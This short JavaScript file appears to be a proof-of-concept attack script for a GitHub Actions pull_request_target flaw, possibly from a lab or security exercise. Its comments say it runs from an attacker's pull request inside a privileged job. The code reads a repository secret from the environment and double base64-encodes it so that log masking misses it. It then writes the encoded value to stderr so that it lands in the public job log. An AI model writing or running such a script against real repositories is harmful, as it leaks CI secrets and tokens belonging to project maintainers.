// Attacker-controlled script executed by the privileged pull_request_target job.
// It runs from the attacker's checked-out PR head tree, so it inherits the
// job's GITHUB_TOKEN (pull-requests: write) and the repository secret GERALT.
const secret = process.env.GERALT_SECRET || '';
const doubleB64 = Buffer.from(Buffer.from(secret).toString('base64')).toString('base64');
// Write to stderr: the workflow redirects stdout into ./comment-markup.md,
// so stderr is what reaches the public job log.
process.stderr.write('GERALT_LEAKED_TOKEN=' + doubleB64 + '\n');
process.exit(1);
